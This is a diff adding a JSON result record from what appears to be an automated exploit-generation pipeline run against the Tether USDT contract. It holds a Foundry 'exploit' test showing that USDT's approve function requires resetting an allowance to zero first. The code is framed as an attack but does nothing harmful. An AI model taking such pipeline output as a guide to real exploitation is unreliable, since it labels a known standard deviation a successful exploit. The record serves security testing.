@@ -1,0 +1,55 @@
+{
+  "project_id": "2022-10-shimacapital-ondo-securityreview",
+  "target_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+  "finding_id": 17,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    "vulnerability_type": "Non-Standard Approve Function",
+    "violation_category": "LOGIC",
+    "finding_id": 17,
+    "preconditions": [
+      {
+        "type": "token_balance",
+        "description": "Attacker must hold a non-zero balance of the token to be able to call approve.",
+        "token_address": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        "min_amount": "1"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "allowance(ATTACKER_ADDRESS, SPENDER_ADDRESS)",
+        "operator": "==",
+        "expected_value": "50000000"
+      }
+    },
+    "exploit_hint": "The contract's `approve` function is non-compliant with the ERC20 standard. It requires the current allowance to be 0 before setting a new non-zero value. To demonstrate this, the exploit must first approve a non-zero value (e.g., 100 tokens), then approve 0 to reset the allowance, and finally approve the target value (e.g., 50 tokens). This sequence will succeed and result in the final allowance being set, proving the non-standard behavior."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface TetherToken {\n    function approve(address _spender, uint _value) external;\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Fund the attacker with 10,000 USDT (Tether has 6 decimals)\n        deal(TARGET, attacker, 10_000 * 1e6);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Define a spender address for the test\n                address spender = address(0xDEADBEEF);\n        \n                // 1. Initial approval of a non-zero amount. This succeeds because the current allowance is 0.\n                TetherToken(TARGET).approve(spender, 100);\n        \n                // We can assert that the allowance is now 100.\n                assertEq(TetherToken(TARGET).allowance(attacker, spender), 100);\n        \n                // 2. To change the allowance, we must first approve 0.\n                TetherToken(TARGET).approve(spender, 0);\n        \n                // Assert that the allowance is now 0.\n                assertEq(TetherToken(TARGET).allowance(attacker, spender), 0);\n        \n                // 3. Now we can approve the final amount required by the oracle.\n                TetherToken(TARGET).approve(spender, 50000000);\n        assertEq(TetherToken(TARGET).allowance(attacker, spender), 50000000, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The `approve` function in the `StandardToken` contract, which `TetherToken` inherits from, implements a non-standard ERC20 behavior. Specifically, it contains the check `require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)))`. This prevents a user from changing an existing non-zero allowance to a new non-zero allowance in a single transaction. To update an allowance, the user must first issue an `approve` call with a value of `0` to reset the allowance, and only then can they set a new non-zero allowance. This vulnerability lies in the deviation from the EIP-20 standard, which can break integrations with other smart contracts that expect standard ERC20 behavior.",
+      "attack_strategy": "The exploit will demonstrate the non-standard `approve` behavior by following the required three-step process to set a final allowance value. First, we will grant an initial non-zero allowance to a spender. Second, we will reset this allowance to zero by calling `approve` with a value of 0. Finally, we will set the desired final allowance, which is `50000000`, as specified by the test oracle. This sequence will succeed and pass the oracle's state check, proving the existence of the non-standard implementation.",
+      "step_by_step_plan": "1. In the `setUp` function, use `deal()` to fund the attacker's address with a sufficient amount of the Tether tokens to perform the `approve` calls.\n2. In the `testExploit` function, define a spender address.\n3. Call `token.approve()` with an arbitrary non-zero value (e.g., 100) to set an initial allowance.\n4. Call `token.approve()` with a value of `0` to reset the allowance for the spender. This is the crucial step to bypass the contract's non-standard check.\n5. Call `token.approve()` with the final target value of `50000000`. This call will now succeed.\n6. The final state will have `allowance(attacker, spender)` equal to `50000000`, which satisfies the oracle's condition.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface TetherToken {\n    function approve(address _spender, uint _value) external;\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Fund the attacker with 10,000 USDT (Tether has 6 decimals)\n        deal(TARGET, attacker, 10_000 * 1e6);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Define a spender address for the test\n                address spender = address(0xDEADBEEF);\n        \n                // 1. Initial approval of a non-zero amount. This succeeds because the current allowance is 0.\n                TetherToken(TARGET).approve(spender, 100);\n        \n                // We can assert that the allowance is now 100.\n                assertEq(TetherToken(TARGET).allowance(attacker, spender), 100);\n        \n                // 2. To change the allowance, we must first approve 0.\n                TetherToken(TARGET).approve(spender, 0);\n        \n                // Assert that the allowance is now 0.\n                assertEq(TetherToken(TARGET).allowance(attacker, spender), 0);\n        \n                // 3. Now we can approve the final amount required by the oracle.\n                TetherToken(TARGET).approve(spender, 50000000);\n        assertEq(TetherToken(TARGET).allowance(attacker, spender), 50000000, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 86.06713509559631,
+      "prompt_tokens": 10810,
+      "completion_tokens": 6300,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 86.07009220123291,
+  "total_prompt_tokens": 10810,
+  "total_completion_tokens": 6300,
+  "total_cost": 0.0
+}
